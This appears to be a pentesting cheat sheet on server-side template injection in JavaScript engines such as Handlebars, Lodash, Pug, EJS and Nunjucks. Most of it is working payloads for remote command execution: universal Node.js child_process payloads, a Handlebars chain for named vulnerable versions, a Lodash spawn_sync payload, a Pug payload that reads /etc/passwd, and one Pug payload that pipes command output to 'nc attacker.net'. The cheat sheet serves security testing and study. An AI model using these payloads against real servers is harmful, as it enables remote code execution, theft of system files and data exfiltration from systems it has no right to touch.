# Server Side Template Injection - JavaScript

> Server-Side Template Injection (SSTI)  occurs when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In the context of JavaScript, SSTI vulnerabilities can arise when using server-side templating engines like Handlebars, EJS, or Pug, where user input is integrated into templates without adequate sanitization.

## Summary

- [Templating Libraries](#templating-libraries)
- [Universal Payloads](#universal-payloads)
- [Handlebars](#handlebars)
    - [Handlebars - Basic Injection](#handlebars---basic-injection)
    - [Handlebars - Command Execution](#handlebars---command-execution)
- [Lodash](#lodash)
    - [Lodash - Basic Injection](#lodash---basic-injection)
    - [Lodash - Command Execution](#lodash---command-execution)
- [Pug](#pug)
- [References](#references)

## Templating Libraries

| Template Name | Payload Format   |
|---------------|------------------|
| DotJS         | `{{= }}`         |
| DustJS        | `{ }`            |
| EJS           | `<% %>`          |
| HandlebarsJS  | `{{ }}`          |
| HoganJS       | `{{ }}`          |
| Lodash        | `{{= }}`         |
| MustacheJS    | `{{ }}`          |
| NunjucksJS    | `{{ }}`          |
| PugJS         | `#{ }`           |
| TwigJS        | `{{ }}`          |
| UnderscoreJS  | `<% %>`          |
| VelocityJS    | `#=set($X="")$X` |
| VueJS         | `{{ }}`          |

## Universal Payloads

Generic code injection payloads work for many NodeJS-based template engines, such as DotJS, EJS, PugJS, UnderscoreJS and Eta.

To use these payloads, wrap them in the appropriate tag.

```javascript
// Rendered RCE
global.process.mainModule.require("child_process").execSync("id")

// Error-Based RCE
global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id"))
""["x"][global.process.mainModule.require("child_process").execSync("id")]

// Boolean-Based RCE
[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", options={shell:true}).status===0)]["length"]

// Time-Based RCE
global.process.mainModule.require("child_process").execSync("id && sleep 5")
```

NunjucksJS is also capable of executing these payloads using `{{range.constructor(' ... ')()}}`.

## Handlebars

[Official website](https://handlebarsjs.com/)
> Handlebars compiles templates into JavaScript functions.

### Handlebars - Basic Injection

```js
{{this}}
{{self}}
```

### Handlebars - Command Execution

This payload only work in handlebars versions, fixed in [GHSA-q42p-pg8m-cqh6](https://github.com/advisories/GHSA-q42p-pg8m-cqh6):

- `>= 4.1.0`, `< 4.1.2`
- `>= 4.0.0`, `< 4.0.14`
- `< 3.0.7`

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Lodash

[Official website](https://lodash.com/docs/4.17.15)
> A modern JavaScript utility library delivering modularity, performance & extras.

### Lodash - Basic Injection

How to create a template:

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

- **string:** The template string.
- **options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.
- **options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.
- **options.escape:** It is a regular expression that specifies the HTML *escape* delimiter.

For the purpose of RCE, the delimiter of templates is determined by the **options.evaluate** parameter.

```javascript
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>


{{= _.templateSettings.evaluate }}
${= _.VERSION}
<%= _.VERSION %>
```

### Lodash - Command Execution

```js
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

---

## Pug

> Universal payloads also work for Pug.

[Official website](https://pugjs.org/api/getting-started.html)
>

```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

## References

- [Exploiting Less.js to Achieve RCE - Jeremy Buis - July 1, 2021](https://web.archive.org/web/20210706135910/https://www.softwaresecured.com/exploiting-less-js/)
- [Handlebars template injection and RCE in a Shopify app - Mahmoud Gamal - April 4, 2019](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
